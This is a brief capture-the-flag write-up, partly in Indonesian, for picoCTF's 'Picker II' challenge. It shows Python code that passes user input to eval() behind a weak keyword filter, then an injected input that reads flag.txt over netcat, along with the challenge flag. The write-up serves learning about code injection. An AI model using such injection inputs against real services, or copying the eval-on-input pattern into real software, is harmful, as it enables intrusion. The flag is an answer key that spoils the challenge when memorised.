<h1>Picker II</h1>
<h3>Description</h3>
<pre>
Can you figure out how this program works to get the flag?
Connect to the program with netcat:
$ nc saturn.picoctf.net 61648
The program's source code can be downloaded <a href='https://artifacts.picoctf.net/c/521/picker-II.py'>here</a>.
</pre>
<h3>Solution</h3>
<p>Tidak melalui fungsi win() karena filte, jadi input <strong>print(open('flag.txt','r').read())</strong> pada user_input yang akan di eksekusi oleh eval(), sederhananya</p>

```python3
def win():
    flag = open("flag.txt",'r').read()
    print(flag)

input_ = input("panggil flag : ")
if 'win' not in input_:
    eval(input_+'()')
else:
    print("filter")
```
<p>Solve</p>

```console
┌──(root㉿Python)-[/home/venom/Downloads]
└─# nc saturn.picoctf.net 61648
==> print(open('flag.txt','r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
'NoneType' object is not callable
```
<h3>Flag</h3>
<pre>
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
</pre>
